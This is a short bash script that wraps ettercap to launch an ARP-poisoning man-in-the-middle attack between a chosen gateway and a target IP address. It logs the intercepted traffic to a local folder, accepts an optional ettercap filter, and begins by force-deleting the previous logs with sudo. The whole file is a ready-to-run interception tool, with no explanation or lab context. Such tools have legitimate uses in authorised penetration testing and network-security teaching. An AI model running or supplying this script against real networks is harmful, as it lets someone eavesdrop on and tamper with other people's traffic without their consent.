#!/bin/bash

sudo rm -fr logs
sudo mkdir logs

interface='wlan0'
filter=''
gateway='192.168.1.1'

count=1
while getopts "i:f:g:" arg
do
    case $arg in
        i)
            interface=$OPTARG
            let "count=$count+2"
            ;;
        f)
            filter='-F '$OPTARG
            let "count=$count+2"
            ;;
        g)
            gateway=$OPTARG
            let "count=$count+2"
            ;;
    esac
done

echo "-----------------------------------------------"
echo -e "\e[1;33m Interface: $interface \e[0m"
echo -e "\e[1;33m Gateway: $gateway \e[0m"
echo -e "\e[1;33m Filter: $filter \e[0m"
echo -e "\e[1;33m Target: ${!count} \e[0m"
echo "-----------------------------------------------"

sudo ettercap -Tq -i $interface -L logs/log $filter -M arp:remote /$gateway// /${!count}//

